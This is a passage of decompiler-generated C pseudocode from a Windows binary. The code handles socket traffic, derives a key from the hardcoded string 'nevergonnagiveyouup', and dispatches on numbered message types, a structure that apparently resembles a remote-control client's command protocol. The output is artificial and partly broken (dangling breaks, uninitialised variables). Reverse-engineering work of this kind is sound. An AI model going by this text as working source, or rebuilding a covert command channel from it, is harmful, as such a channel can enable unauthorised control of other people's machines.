                            if (v13 == 0) {
                                // 0x405d76
                                v6 = a2;
                                function_40366b(a2);
                                // 0x405c44
                                v5 = (int32_t)&v6 + 4;
                                goto lab_0x405e45;
                            } else {
                                // 0x405d5d
                                v5 = v4;
                                if (v13 == 2) {
                                    // 0x405d67
                                    function_410c8a();
                                    v5 = v4;
                                }
                                goto lab_0x405e45;
                            }
                        }
                    }
                }
            }
        }
    } else {
        if (a1 == 34) {
            // 0x405d25
            v6 = a2;
            function_4036ea(a2);
            // 0x405c44
            v5 = (int32_t)&v6 + 4;
            goto lab_0x405e45;
        } else {
            if (a1 > 16) {
                if (a1 > 26) {
                    if (a1 == 28) {
                        // 0x405d19
                        function_4037e6(v1, v2, v1);
                        v5 = v4;
                    } else {
                        int32_t v14 = a1 - 30; // 0x405cf3
                        if (v14 == 0) {
                            // 0x405d0e
                            v6 = a2;
                            function_4179b8(a2);
                            v5 = &v6;
                        } else {
                            // 0x405cf8
                            v5 = v4;
                            if (v14 == 2) {
                                // 0x405d02
                                function_410249(v2);
                                v5 = &v7;
                            }
                        }
                    }
                } else {
                    switch (a1) {
                        case 26: {
                            // 0x405e54
                            function_403978(v2, v1, v2, v1);
                            // UNREACHABLE
                        }
                        case 18: {
                            // 0x405ce3
                            function_4039ca();
                            v5 = v4;
                            // break -> 0x405e45
                            break;
                        }
                        case 20: {
                            int32_t v15 = *(int32_t *)(a2 + 4); // 0x405cd5
                            v6 = v15;
                            function_4163f3(v2, v15);
                            v5 = &v7;
                            // break -> 0x405e45
                            break;
                        }
                        default: {
                            int32_t v16 = a1 - 22; // 0x405cb2
                            if (v16 == 0) {
                                // 0x405ccb
                                function_4163bc();
                                v5 = v4;
                            } else {
                                // 0x405cb7
                                v5 = v4;
                                if (v16 == 2) {
                                    // 0x405cc1
                                    function_4039a2(v1, v2, v1);
                                    v5 = v4;
                                }
                            }
                            // break -> 0x405e45
                            break;
                        }
                    }
                }
                goto lab_0x405e45;
            } else {
                if (a1 == 16) {
                    // 0x405c8f
                    function_403a14();
                    v5 = v4;
                    goto lab_0x405e45;
                } else {
                    if (a1 > 8) {
                        if (a1 == 10) {
                            // 0x405c83
                            function_403b17(v1, v2, v1);
                            v5 = v4;
                        } else {
                            int32_t v17 = a1 - 12; // 0x405c5c
                            if (v17 == 0) {
                                // 0x405c77
                                function_403ac2();
                                v5 = v4;
                            } else {
                                // 0x405c61
                                v5 = v4;
                                if (v17 == 2) {
                                    // 0x405c6b
                                    function_403a31(v1, v2, v1);
                                    v5 = v4;
                                }
                            }
                        }
                        goto lab_0x405e45;
                    } else {
                        switch (a1) {
                            case 8: {
                                // 0x405c4a
                                function_403c13();
                                v5 = v4;
                                goto lab_0x405e45;
                            }
                            case 0: {
                                // 0x405c38
                                function_403d11(v2, v1, v2, v1);
                                // 0x405c44
                                v5 = (int32_t)&v6 + 4;
                                goto lab_0x405e45;
                            }
                            case 2: {
                                // 0x405c2e
                                function_403cc8();
                                v5 = v4;
                                goto lab_0x405e45;
                            }
                            default: {
                                int32_t v18 = a1 - 4; // 0x405c09
                                if (v18 == 0) {
                                    // 0x405c24
                                    function_403c7f();
                                    v5 = v4;
                                } else {
                                    // 0x405c0e
                                    v5 = v4;
                                    if (v18 == 2) {
                                        // 0x405c18
                                        function_403c2a();
                                        v5 = v4;
                                    }
                                }
                                goto lab_0x405e45;
                            }
                        }
                    }
                }
            }
        }
    }
  lab_0x405e45:
    // 0x405e45
    *(int32_t *)(v5 - 4) = 1;
    // 0x405e4d
    return *(int32_t *)a2;
}

// Address range: 0x405e61 - 0x405ef2
int32_t function_405e61(void) {
    // 0x405e61
    int32_t v1; // 0x405e61
    int32_t * v2 = (int32_t *)(v1 + 584); // 0x405e6c
    *v2 = 1;
    int32_t result = v1 + 484;
    int32_t v3; // bp-36, 0x405e61
    int32_t v4 = &v3;
    int32_t v5; // bp-20, 0x405e61
    *(int32_t *)(v4 - 4) = (int32_t)&v5;
    int32_t v6 = *(int32_t *)(function_406d2f(&g322) + 4); // 0x405e8d
    int32_t v7; // bp-12, 0x405e61
    *(int32_t *)(v4 - 8) = (int32_t)&v7;
    function_406d2f(&g322);
    *(int32_t *)(v4 - 12) = v6;
    int32_t v8 = v4 - 16; // 0x405e9a
    *(int32_t *)v8 = result;
    int32_t v9 = v4 - 20; // 0x405e9b
    *(int32_t *)v9 = v8;
    function_40456d(&g322);
    int32_t v10 = function_406871((int32_t)&g322, (int32_t)&g322); // 0x405ea6
    function_406f1d();
    v7 = 0;
    function_406f1d();
    v5 = 0;
    int32_t v11 = v9; // 0x405ec7
    if (v10 != 0) {
        // 0x405ec9
        v11 = v4 - 24;
        function_4066a8(v5);
    }
    int32_t v12 = v11 - 4; // 0x405ed2
    *(int32_t *)v12 = *(int32_t *)(v1 + 536);
    Sleep((int32_t)&g322);
    while (*v2 != 0) {
        // 0x405e7c
        v4 = v12;
        *(int32_t *)(v4 - 4) = (int32_t)&v5;
        v6 = *(int32_t *)(function_406d2f(&g322) + 4);
        *(int32_t *)(v4 - 8) = (int32_t)&v7;
        function_406d2f(&g322);
        *(int32_t *)(v4 - 12) = v6;
        v8 = v4 - 16;
        *(int32_t *)v8 = result;
        v9 = v4 - 20;
        *(int32_t *)v9 = v8;
        function_40456d(&g322);
        v10 = function_406871((int32_t)&g322, (int32_t)&g322);
        function_406f1d();
        v7 = 0;
        function_406f1d();
        v5 = 0;
        v11 = v9;
        if (v10 != 0) {
            // 0x405ec9
            v11 = v4 - 24;
            function_4066a8(v5);
        }
        // 0x405ed2
        v12 = v11 - 4;
        *(int32_t *)v12 = *(int32_t *)(v1 + 536);
        Sleep((int32_t)&g322);
    }
    // 0x405eed
    return result;
}

// Address range: 0x405ef2 - 0x405f32
int32_t function_405ef2(int32_t * a1, int32_t * a2) {
    // 0x405ef2
    int32_t result; // 0x405ef2
    *(int32_t *)result = (int32_t)&g71;
    function_40696e();
    function_40238e((int32_t)a1);
    *(int32_t *)(result + 576) = 0;
    *(int32_t *)(result + 584) = 0;
    *(int32_t *)(result + 572) = (int32_t)a2;
    return result;
}

// Address range: 0x405f32 - 0x405f5d
int32_t function_405f32(int32_t * a1) {
    // 0x405f32
    function_40661e(*a1);
    return function_404081();
}

// Address range: 0x405f5d - 0x405f6c
int32_t function_405f5d(void) {
    // 0x405f5d
    int32_t v1; // 0x405f5d
    *(int32_t *)(v1 + 584) = 0;
    return function_4065fd();
}

// Address range: 0x405f6c - 0x4065c3
int32_t function_405f6c(int32_t a1) {
    // 0x405f6c
    int32_t v1; // 0x405f6c
    int32_t * v2 = (int32_t *)(v1 + 24); // 0x405f7d
    int32_t v3 = *v2; // 0x405f7d
    int32_t v4 = v3; // 0x405f81
    int32_t * v5; // 0x405f6c
    int32_t * v6; // 0x405f6c
    int32_t result; // 0x405f6c
    if (v3 != 0) {
        goto lab_0x405fad;
    } else {
        int32_t * v7 = (int32_t *)(v1 + 20);
        v4 = v3;
        if (*v7 < 12) {
            goto lab_0x405fad;
        } else {
            int32_t v8 = *(int32_t *)(v1 + 16); // 0x405f89
            if (*(int32_t *)v8 != -0x1b9944d7) {
                int32_t v9 = function_403ffa(); // 0x405fa8
                v4 = *v2;
                result = v9;
                goto lab_0x405fad;
            } else {
                int32_t * v10 = (int32_t *)(v1 + 40);
                *v10 = *(int32_t *)(v8 + 4);
                *(int32_t *)(v1 + 44) = *(int32_t *)(v8 + 8);
                *v2 = 1;
                v6 = v10;
                v5 = v7;
                goto lab_0x405fb6;
            }
        }
    }
  lab_0x405fad:
    // 0x405fad
    if (v4 != 1) {
        // 0x4065bc
        return result;
    }
    // 0x405fad
    v6 = (int32_t *)(v1 + 40);
    v5 = (int32_t *)(v1 + 20);
    goto lab_0x405fb6;
  lab_0x405fb6:;
    uint32_t result2 = *v5 - 12; // 0x405fb9
    uint32_t v11 = *v6; // 0x405fbf
    if (result2 < v11) {
        // 0x4065bc
        return result2;
    }
    int32_t v12 = v1 + 16; // 0x405fc8
    int32_t v13 = *(int32_t *)v12 + 12; // 0x405fd1
    int32_t v14 = v13; // bp-48, 0x405fd6
    int32_t v15 = &v14; // 0x405fd6
    function_403fc7(v13, v11);
    int32_t * v16 = (int32_t *)(v1 + 44); // 0x405fdc
    uint32_t v17 = *v16; // 0x405fdc
    int32_t v18; // 0x405f6c
    int32_t v19; // 0x405f6c
    int32_t v20; // 0x405f6c
    int32_t v21; // 0x405f6c
    int32_t v22; // 0x405f6c
    int32_t v23; // 0x405f6c
    if (v17 < 39) {
        if (v17 == 38) {
            int32_t v24 = function_406fa7(); // 0x4062c4
            v21 = 0;
            if (v24 != 0) {
                // 0x4062d3
                *(int32_t *)v24 = (int32_t)&g46;
                v21 = v24;
            }
            goto lab_0x406531;
        } else {
            if (v17 < 19) {
                if (v17 == 18) {
                    int32_t v25 = function_406fa7(); // 0x40614a
                    v21 = 0;
                    if (v25 != 0) {
                        // 0x406159
                        *(int32_t *)v25 = (int32_t)&g35;
                        v21 = v25;
                    }
                    goto lab_0x406531;
                } else {
                    if (v17 < 9) {
                        switch (v17) {
                            case 8: {
                                int32_t v26 = function_406fa7(); // 0x4060a2
                                v21 = 0;
                                if (v26 == 0) {
                                    goto lab_0x406531;
                                } else {
                                    // 0x4060b1
                                    *(int32_t *)v26 = (int32_t)&g23;
                                    v19 = v26;
                                    goto lab_0x4060b7;
                                }
                            }
                            case 0: {
                                int32_t v27 = function_406fa7(); // 0x406085
                                v21 = 0;
                                if (v27 != 0) {
                                    // 0x406094
                                    *(int32_t *)v27 = (int32_t)&g26;
                                    v21 = v27;
                                }
                                goto lab_0x406531;
                            }
                            case 2: {
                                int32_t v28 = function_406fa7(); // 0x406068
                                v21 = 0;
                                if (v28 != 0) {
                                    // 0x406077
                                    *(int32_t *)v28 = (int32_t)&g34;
                                    v21 = v28;
                                }
                                goto lab_0x406531;
                            }
                            default: {
                                int32_t v29 = v17 - 4; // 0x40601b
                                if (v29 == 0) {
                                    int32_t v30 = function_406fa7(); // 0x40604b
                                    v21 = 0;
                                    if (v30 != 0) {
                                        // 0x40605a
                                        *(int32_t *)v30 = (int32_t)&g32;
                                        v21 = v30;
                                    }
                                    goto lab_0x406531;
                                } else {
                                    // 0x406020
                                    v23 = v15;
                                    v22 = 0;
                                    if (v29 != 2) {
                                        goto lab_0x406539;
                                    } else {
                                        int32_t v31 = function_406fa7(); // 0x40602a
                                        v21 = 0;
                                        if (v31 == 0) {
                                            goto lab_0x406531;
                                        } else {
                                            // 0x406039
                                            *(int32_t *)v31 = (int32_t)&g30;
                                            v18 = v31;
                                            goto lab_0x40603f;
                                        }
                                    }
                                }
                            }
                        }
                    } else {
                        switch (v17) {
                            case 10: {
                                int32_t v32 = function_406fa7(); // 0x40612d
                                v21 = 0;
                                if (v32 == 0) {
                                    goto lab_0x406531;
                                } else {
                                    // 0x40613c
                                    *(int32_t *)v32 = (int32_t)&g21;
                                    v18 = v32;
                                    goto lab_0x40603f;
                                }
                            }
                            case 12: {
                                int32_t v33 = function_406fa7(); // 0x406113
                                v21 = 0;
                                if (v33 != 0) {
                                    // 0x406122
                                    *(int32_t *)v33 = (int32_t)&g28;
                                    v21 = v33;
                                }
                                goto lab_0x406531;
                            }
                            default: {
                                int32_t v34 = v17 - 14; // 0x4060cc
                                if (v34 == 0) {
                                    int32_t v35 = function_406fa7(); // 0x4060f9
                                    v21 = 0;
                                    if (v35 == 0) {
                                        goto lab_0x406531;
                                    } else {
                                        // 0x406108
                                        *(int32_t *)v35 = (int32_t)&g42;
                                        v18 = v35;
                                        goto lab_0x40603f;
                                    }
                                } else {
                                    // 0x4060d1
                                    v23 = v15;
                                    v22 = 0;
                                    if (v34 != 2) {
                                        goto lab_0x406539;
                                    } else {
                                        int32_t v36 = function_406fa7(); // 0x4060db
                                        v21 = 0;
                                        if (v36 != 0) {
                                            // 0x4060ea
                                            *(int32_t *)(v36 + 4) = -1;
                                            *(int32_t *)v36 = (int32_t)&g14;
                                            v21 = v36;
                                        }
                                        goto lab_0x406531;
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                if (v17 < 29) {
                    switch (v17) {
                        case 28: {
                            int32_t v37 = function_406fa7(); // 0x406205
                            v21 = 0;
                            if (v37 != 0) {
                                // 0x406214
                                *(int32_t *)v37 = (int32_t)&g49;
                                *(int32_t *)(v37 + 8) = 0;
                                *(int32_t *)(v37 + 24) = 0;
                                *(int32_t *)(v37 + 28) = 0;
                                v21 = v37;
                            }
                            goto lab_0x406531;
                        }
                        case 20: {
                            int32_t v38 = function_406fa7(); // 0x4061e8
                            v21 = 0;
                            if (v38 != 0) {
                                // 0x4061f7
                                *(int32_t *)v38 = (int32_t)&g45;
                                v21 = v38;
                            }
                            goto lab_0x406531;
                        }
                        case 22: {
                            int32_t v39 = function_406fa7(); // 0x4061cb
                            v21 = 0;
                            if (v39 != 0) {
                                // 0x4061da
                                *(int32_t *)v39 = (int32_t)&g47;
                                v21 = v39;
                            }
                            goto lab_0x406531;
                        }
                        default: {
                            int32_t v40 = v17 - 24; // 0x40617f
                            if (v40 == 0) {
                                int32_t v41 = function_406fa7(); // 0x4061ae
                                v21 = 0;
                                if (v41 != 0) {
                                    // 0x4061bd
                                    *(int32_t *)v41 = (int32_t)&g36;
                                    v21 = v41;
                                }
                                goto lab_0x406531;
                            } else {
                                // 0x406184
                                v23 = v15;
                                v22 = 0;
                                if (v40 != 2) {
                                    goto lab_0x406539;
                                } else {
                                    int32_t v42 = function_406fa7(); // 0x406191
                                    v21 = 0;
                                    if (v42 != 0) {
                                        // 0x4061a0
                                        *(int32_t *)v42 = (int32_t)&g48;
                                        v21 = v42;
                                    }
                                    goto lab_0x406531;
                                }
                            }
                        }
                    }
                } else {
                    switch (v17) {
                        case 30: {
                            int32_t v43 = function_406fa7(); // 0x40629f
                            v21 = 0;
                            if (v43 == 0) {
                                goto lab_0x406531;
                            } else {
                                // 0x4062ae
                                *(int32_t *)v43 = (int32_t)&g41;
                                v20 = v43;
                                goto lab_0x4062b4;
                            }
                        }
                        case 32: {
                            int32_t v44 = function_406fa7(); // 0x406282
                            v21 = 0;
                            if (v44 != 0) {
                                // 0x406291
                                *(int32_t *)v44 = (int32_t)&g33;
                                v21 = v44;
                            }
                            goto lab_0x406531;
                        }
                        default: {
                            int32_t v45 = v17 - 34; // 0x406236
                            if (v45 == 0) {
                                int32_t v46 = function_406fa7(); // 0x406265
                                v21 = 0;
                                if (v46 == 0) {
                                    goto lab_0x406531;
                                } else {
                                    // 0x406274
                                    *(int32_t *)v46 = (int32_t)&g22;
                                    v18 = v46;
                                    goto lab_0x40603f;
                                }
                            } else {
                                // 0x40623b
                                v23 = v15;
                                v22 = 0;
                                if (v45 != 2) {
                                    goto lab_0x406539;
                                } else {
                                    int32_t v47 = function_406fa7(); // 0x406248
                                    v21 = 0;
                                    if (v47 != 0) {
                                        // 0x406257
                                        *(int32_t *)v47 = (int32_t)&g43;
                                        v21 = v47;
                                    }
                                    goto lab_0x406531;
                                }
                            }
                        }
                    }
                }
            }
        }
    } else {
        if (v17 < 61) {
            if (v17 == 60) {
                int32_t v48 = function_406fa7(); // 0x406443
                v21 = 0;
                if (v48 != 0) {
                    // 0x406452
                    *(int32_t *)v48 = (int32_t)&g132;
                    v21 = v48;
                }
                goto lab_0x406531;
            } else {
                if (v17 < 49) {
                    switch (v17) {
                        case 48: {
                            int32_t v49 = function_406fa7(); // 0x406398
                            v21 = 0;
                            if (v49 != 0) {
                                // 0x4063a7
                                *(int32_t *)v49 = (int32_t)&g134;
                                v21 = v49;
                            }
                            goto lab_0x406531;
                        }
                        case 40: {
                            int32_t v50 = function_406fa7(); // 0x40637b
                            v21 = 0;
                            if (v50 != 0) {
                                // 0x40638a
                                *(int32_t *)v50 = (int32_t)&g44;
                                v21 = v50;
                            }
                            goto lab_0x406531;
                        }
                        case 42: {
                            int32_t v51 = function_406fa7(); // 0x40635e
                            if (v51 == 0) {
                                // 0x406330
                                v21 = 0;
                                goto lab_0x406531;
                            } else {
                                // 0x406369
                                *(int32_t *)v51 = (int32_t)&g50;
                                int32_t v52 = v51 + 4;
                                *(int32_t *)v52 = (int32_t)&g51;
                                v21 = v52;
                                goto lab_0x406531;
                            }
                        }
                        default: {
                            int32_t v53 = v17 - 44; // 0x406308
                            if (v53 == 0) {
                                int32_t v54 = function_406fa7(); // 0x406341
                                if (v54 == 0) {
                                    // 0x406330
                                    v21 = 0;
                                    goto lab_0x406531;
                                } else {
                                    // 0x40634c
                                    *(int32_t *)v54 = (int32_t)&g55;
                                    int32_t v55 = v54 + 4;
                                    *(int32_t *)v55 = (int32_t)&g54;
                                    v21 = v55;
                                    goto lab_0x406531;
                                }
                            } else {
                                // 0x40630d
                                v23 = v15;
                                v22 = 0;
                                if (v53 != 2) {
                                    goto lab_0x406539;
                                } else {
                                    // 0x406317
                                    if (function_406fa7() == 0) {
                                        // 0x406330
                                        v21 = 0;
                                        goto lab_0x406531;
                                    } else {
                                        int32_t v56 = function_404f78(); // 0x406325
                                        v21 = v56 + 4;
                                        if (v56 == 0) {
                                            // 0x406330
                                            v21 = 0;
                                            goto lab_0x406531;
                                        } else {
                                            goto lab_0x406531;
                                        }
                                    }
                                }
                            }
                        }
                    }
                } else {
                    switch (v17) {
                        case 50: {
                            int32_t v57 = function_406fa7(); // 0x406426
                            v21 = 0;
                            if (v57 != 0) {
                                // 0x406435
                                *(int32_t *)v57 = (int32_t)&g135;
                                v21 = v57;
                            }
                            goto lab_0x406531;
                        }
                        case 54: {
                            int32_t v58 = function_406fa7(); // 0x406409
                            v21 = 0;
                            if (v58 == 0) {
                                goto lab_0x406531;
                            } else {
                                // 0x406418
                                *(int32_t *)v58 = (int32_t)&g129;
                                v18 = v58;
                                goto lab_0x40603f;
                            }
                        }
                        default: {
                            int32_t v59 = v17 - 56; // 0x4063bd
                            if (v59 == 0) {
                                int32_t v60 = function_406fa7(); // 0x4063ec
                                v21 = 0;
                                if (v60 != 0) {
                                    // 0x4063fb
                                    *(int32_t *)v60 = (int32_t)&g38;
                                    v21 = v60;
                                }
                                goto lab_0x406531;
                            } else {
                                // 0x4063c2
                                v23 = v15;
                                v22 = 0;
                                if (v59 != 2) {
                                    goto lab_0x406539;
                                } else {
                                    int32_t v61 = function_406fa7(); // 0x4063cf
                                    v21 = 0;
                                    if (v61 == 0) {
                                        goto lab_0x406531;
                                    } else {
                                        // 0x4063de
                                        *(int32_t *)v61 = (int32_t)&g127;
                                        v19 = v61;
                                        goto lab_0x4060b7;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } else {
            if (v17 < 77) {
                switch (v17) {
                    case 76: {
                        int32_t v62 = function_406fa7(); // 0x4064c9
                        v21 = 0;
                        if (v62 != 0) {
                            // 0x4064d4
                            *(int32_t *)v62 = (int32_t)&g24;
                            v21 = v62;
                        }
                        goto lab_0x406531;
                    }
                    case 62: {
                        // 0x4064bf
                        function_4158f7();
                        v23 = v15;
                        v22 = 0;
                        goto lab_0x406539;
                    }
                    case 64: {
                        // 0x4064b8
                        function_415974();
                        v23 = v15;
                        v22 = 0;
                        goto lab_0x406539;
                    }
                    default: {
                        int32_t v63 = v17 - 72; // 0x40646f
                        if (v63 == 0) {
                            int32_t v64 = function_406fa7(); // 0x40649e
                            v21 = 0;
                            if (v64 == 0) {
                                goto lab_0x406531;
                            } else {
                                // 0x4064ad
                                *(int32_t *)v64 = (int32_t)&g27;
                                v20 = v64;
                                goto lab_0x4062b4;
                            }
                        } else {
                            // 0x406474
                            v23 = v15;
                            v22 = 0;
                            if (v63 != 2) {
                                goto lab_0x406539;
                            } else {
                                int32_t v65 = function_406fa7(); // 0x406481
                                v21 = 0;
                                if (v65 == 0) {
                                    goto lab_0x406531;
                                } else {
                                    // 0x406490
                                    *(int32_t *)v65 = (int32_t)&g128;
                                    v19 = v65;
                                    goto lab_0x4060b7;
                                }
                            }
                        }
                    }
                }
            } else {
                if (v17 == 78) {
                    int32_t v66 = function_406fa7(); // 0x40651c
                    v21 = 0;
                    if (v66 != 0) {
                        // 0x406527
                        *(int32_t *)v66 = (int32_t)&g39;
                        v21 = v66;
                    }
                    goto lab_0x406531;
                } else {
                    int32_t v67 = v17 - 80; // 0x4064e2
                    if (v67 == 0) {
                        int32_t v68 = function_406fa7(); // 0x406506
                        v21 = 0;
                        if (v68 != 0) {
                            // 0x406511
                            *(int32_t *)v68 = (int32_t)&g31;
                            v21 = v68;
                        }
                        goto lab_0x406531;
                    } else {
                        // 0x4064e7
                        v23 = v15;
                        v22 = 0;
                        if (v67 != 2) {
                            goto lab_0x406539;
                        } else {
                            int32_t v69 = function_406fa7(); // 0x4064f0
                            v21 = 0;
                            if (v69 != 0) {
                                // 0x4064fb
                                *(int32_t *)v69 = (int32_t)&g29;
                                v21 = v69;
                            }
                            goto lab_0x406531;
                        }
                    }
                }
            }
        }
    }
  lab_0x406531:;
    int32_t v70 = v15 - 4; // 0x406535
    *(int32_t *)v70 = v1 + 48;
    v23 = v70;
    v22 = v21;
    goto lab_0x406539;
  lab_0x406539:
    // 0x406539
    *(int32_t *)(v23 - 4) = v22;
    *(int32_t *)(v23 - 8) = *v16;
    int32_t v71; // 0x405f6c
    if (result2 > *v6) {
        // 0x406551
        *(int32_t *)(v23 - 12) = v12;
        function_404094((int32_t)&g322);
        int32_t v72 = *v6; // 0x40655d
        *(int32_t *)(v23 - 16) = -12 - v72 + *v5;
        *(int32_t *)(v23 - 20) = v72 + 12;
        int32_t v73; // bp-24, 0x405f6c
        int32_t v74 = &v73; // 0x406573
        *(int32_t *)(v23 - 24) = v74;
        function_403e83(&g322, (int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v23 - 28) = v74;
        function_403eca((int32_t)&g322);
        *v2 = 0;
        *(int32_t *)(v23 - 32) = a1;
        function_405f6c((int32_t)&g322);
        function_404081();
        v71 = function_404081();
    } else {
        // 0x4065a3
        v71 = function_403ffa();
    }
    int32_t result3 = v71; // 0x4065af
    if (*(int32_t *)(v1 + 52) != 0) {
        // 0x4065b1
        result3 = function_403ffa();
    }
    // 0x4065b8
    *v2 = 0;
    // 0x4065bc
    return result3;
  lab_0x4062b4:
    // 0x4062b4
    *(int32_t *)(v20 + 12) = 0;
    *(int32_t *)(v20 + 16) = 0;
    v21 = v20;
    goto lab_0x406531;
  lab_0x40603f:
    // 0x40603f
    *(int32_t *)(v18 + 4) = 0;
    v21 = v18;
    goto lab_0x406531;
  lab_0x4060b7:
    // 0x4060b7
    *(int32_t *)(v19 + 8) = 0;
    v21 = v19;
    goto lab_0x406531;
}

// Address range: 0x4065c3 - 0x4065d1
int32_t function_4065c3(void) {
    // 0x4065c3
    int32_t v1; // 0x4065c3
    return v1 == -0x1b9944d7;
}

// Address range: 0x4065d1 - 0x4065fd
int32_t function_4065d1(void) {
    // 0x4065d1
    WSACleanup();
    function_41405b();
    function_404081();
    function_404081();
    return function_406f1d();
}

// Address range: 0x4065fd - 0x40661e
int32_t function_4065fd(void) {
    // 0x4065fd
    int32_t v1; // 0x4065fd
    int32_t * sock = (int32_t *)(v1 + 12); // 0x406602
    *(int32_t *)(v1 + 8) = 0;
    shutdown(*sock, SHUT_RDWR);
    int32_t result = closesocket(*sock); // 0x406612
    *sock = -1;
    return result;
}

// Address range: 0x40661e - 0x4066a8
int32_t function_40661e(int32_t a1) {
    // 0x40661e
    int32_t v1; // 0x40661e
    int32_t * sock = (int32_t *)(v1 + 12); // 0x406629
    int32_t result = 0; // 0x40662d
    if (*sock != -1) {
        // 0x406633
        function_40403b(function_40434f("nevergonnagiveyouup"));
        function_406f1d();
        function_404094(a1);
        int32_t v2; // bp-24, 0x40661e
        function_404094((int32_t)&v2);
        function_40709b((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
        char * buf; // 0x40661e
        int32_t v3 = send(*sock, buf, *(int32_t *)(a1 + 4), 0); // 0x406681
        function_404081();
        function_404081();
        result = v3 != -1;
    }
    // 0x4066a1
    return result;
}

// Address range: 0x4066a8 - 0x406871
int32_t function_4066a8(int32_t a1) {
    // 0x4066a8
    int32_t v1; // 0x4066a8
    int32_t result = function_401230(v1); // 0x4066b0
    int32_t * v2 = (int32_t *)(v1 + 12); // 0x4066ba
    if (*v2 == -1) {
        // 0x40686a
        return result;
    }
    // 0x4066c4
    int32_t v3; // bp-16, 0x4066a8
    int32_t v4 = &v3; // 0x4066b9
    int32_t option_value; // bp-28, 0x4066a8
    char * v5 = (char *)&option_value; // bp-24, 0x4066d0
    option_value = 0x1006;
    int32_t sock = *v2; // 0x4066dc
    setsockopt(sock, 0xffff, 0x1006, (char *)&option_value, 4);
    int32_t v6; // bp-65592, 0x4066a8
    function_401293(&v6, 0, 0xffff);
    int32_t v7 = function_40434f("nevergonnagiveyouup"); // 0x406700
    int32_t v8 = v7; // bp-44, 0x406705
    function_40403b(v7);
    function_406f1d();
    v3 = 0;
    int32_t v9 = &v6; // 0x406725
    int32_t v10 = (int32_t)&v5;
    int32_t v11; // bp-52, 0x4066a8
    int32_t v12 = &v11;
    int32_t v13 = &v8;
    *(int32_t *)(v13 - 4) = 0;
    *(int32_t *)(v13 - 8) = 12;
    *(int32_t *)(v13 - 12) = v9;
    int32_t v14 = v13 - 16; // 0x406726
    *(int32_t *)v14 = *v2;
    int32_t v15 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322); // 0x406729
    int32_t v16; // 0x4066a8
    int32_t v17; // 0x4066a8
    int32_t v18; // 0x4066a8
    int32_t v19; // 0x4066a8
    int32_t v20; // 0x4066a8
    int32_t v21; // 0x4066a8
    int32_t v22; // 0x406751
    int32_t v23; // 0x406778
    int32_t v24; // 0x40677b
    int32_t v25; // 0x406792
    int32_t v26; // 0x406795
    int32_t v27; // 0x4067a4
    if (v15 != 12) {
        // 0x4067c4
        v21 = v14;
        v18 = v15;
        if (v15 == -1) {
            // break -> 0x406862
            break;
        }
    } else {
        // 0x40673a
        *(int32_t *)(v13 - 20) = v15;
        v5 = NULL;
        *(int32_t *)(v13 - 24) = v9;
        function_403fc7((int32_t)v5, 0);
        *(int32_t *)(v13 - 28) = v10;
        v22 = v13 - 32;
        *(int32_t *)v22 = v10;
        *(int32_t *)(v13 - 36) = v10;
        function_404094((int32_t)&g322);
        *(int32_t *)(v13 - 40) = v22;
        *(int32_t *)(v13 - 44) = v22;
        *(int32_t *)(v13 - 48) = v12;
        function_404094((int32_t)&g322);
        function_40709b((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
        v23 = *(int32_t *)(v8 + 4);
        v24 = v23 + 12;
        v19 = v22;
        v16 = v15;
        v20 = v22;
        v17 = v15;
        if (v23 != 0) {
            *(int32_t *)(v19 - 4) = 0;
            *(int32_t *)(v19 - 8) = v24 - v16;
            *(int32_t *)(v19 - 12) = v16 + v9;
            v25 = v19 - 16;
            *(int32_t *)v25 = *v2;
            v26 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322);
            if (v26 == -1) {
                // 0x40684e
                function_404081();
                if (v5 == NULL) {
                    return function_404081();
                } else {
                    // 0x40685d
                    function_406f66();
                    return function_404081();
                }
            }
            // 0x4067a4
            v27 = v26 + v16;
            v19 = v25;
            v16 = v27;
            v20 = v25;
            v17 = v27;
            while (v24 != v27) {
                // 0x406782
                *(int32_t *)(v19 - 4) = 0;
                *(int32_t *)(v19 - 8) = v24 - v16;
                *(int32_t *)(v19 - 12) = v16 + v9;
                v25 = v19 - 16;
                *(int32_t *)v25 = *v2;
                v26 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322);
                if (v26 == -1) {
                    // 0x40684e
                    function_404081();
                    if (v5 == NULL) {
                        return function_404081();
                    } else {
                        // 0x40685d
                        function_406f66();
                        return function_404081();
                    }
                }
                // 0x4067a4
                v27 = v26 + v16;
                v19 = v25;
                v16 = v27;
                v20 = v25;
                v17 = v27;
            }
        }
        // 0x4067aa
        function_404081();
        if (v5 != NULL) {
            // 0x4067b9
            function_406f66();
        }
        // 0x4067be
        v5 = NULL;
        v21 = v20;
        v18 = v17;
    }
    int32_t v28 = v18;
    *(int32_t *)(v21 - 4) = v28;
    *(int32_t *)(v21 - 8) = v9;
    function_403fc7((int32_t)&g322, (int32_t)&g322);
    *(int32_t *)(v21 - 12) = v4;
    int32_t v29 = v21 - 16; // 0x4067de
    *(int32_t *)v29 = v4;
    int32_t * v30 = (int32_t *)(v21 - 20); // 0x4067e4
    *v30 = v4;
    function_404094((int32_t)&g322);
    int32_t * v31 = (int32_t *)(v21 - 24); // 0x4067ea
    *v31 = v29;
    int32_t v32 = v21 - 28; // 0x4067eb
    int32_t * v33 = (int32_t *)v32; // 0x4067eb
    *v33 = v29;
    *(int32_t *)(v21 - 32) = v12;
    function_404094((int32_t)&g322);
    function_40709b((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    function_403ffa();
    *v30 = v28;
    *v31 = sock;
    function_403fc7((int32_t)&g322, (int32_t)&g322);
    if (v3 != 0) {
        // 0x40681d
        function_406f66();
    }
    // 0x406822
    v3 = 0;
    function_403ffa();
    *v33 = a1;
    function_405f6c((int32_t)&g322);
    function_404081();
    while (v28 >= 0 == (v28 != 0)) {
        // 0x40671c
        v13 = v32;
        *(int32_t *)(v13 - 4) = 0;
        *(int32_t *)(v13 - 8) = 12;
        *(int32_t *)(v13 - 12) = v9;
        v14 = v13 - 16;
        *(int32_t *)v14 = *v2;
        v15 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322);
        if (v15 != 12) {
            // 0x4067c4
            v21 = v14;
            v18 = v15;
            if (v15 == -1) {
                // break -> 0x406862
                break;
            }
        } else {
            // 0x40673a
